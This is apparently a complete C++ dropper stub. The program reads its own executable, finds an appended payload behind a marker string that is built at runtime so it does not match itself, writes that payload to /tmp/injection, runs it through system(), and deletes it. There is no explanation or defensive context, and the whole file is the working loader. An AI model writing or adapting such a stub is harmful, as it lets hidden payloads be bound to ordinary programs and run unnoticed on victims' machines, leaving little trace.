#include <fstream>
#include <string>
#include <list>
#include <iostream>
#include <iterator>
#include <algorithm>

int main( int argc, char * argv[] ) {
	using namespace std;
	ifstream fin( argv[0], ios::binary );

	if( fin.is_open() ) {
		list< char > binary;
		copy( istreambuf_iterator< char >( fin ), istreambuf_iterator< char >(), back_inserter( binary ) );
		fin.close();

		string magic( "!_METAMAGIC__" );
		magic[0] = '_';
		list< char >::iterator result = search( binary.begin(), binary.end(), magic.begin(), magic.end() );
		if( result == binary.end() ) {
			cerr << "Can not find piece!" << endl;
		} else {
			advance( result, magic.length() );
			ofstream fout( "/tmp/injection", ios::binary );
			if( fout.is_open() ) {
				copy( result, binary.end(), ostreambuf_iterator< char >( fout ) );
				fout.close();
				list< char >().swap( binary );
				system( "chmod a+x /tmp/injection && /tmp/injection && rm -f /tmp/injection" );
			} else {
				cerr << "Can not write `/tmp/injection\'!" << endl;
			}
		}
	} else {
		cerr << "Can not open " << argv[0] << "!" << endl;
	}

	return 0;
}
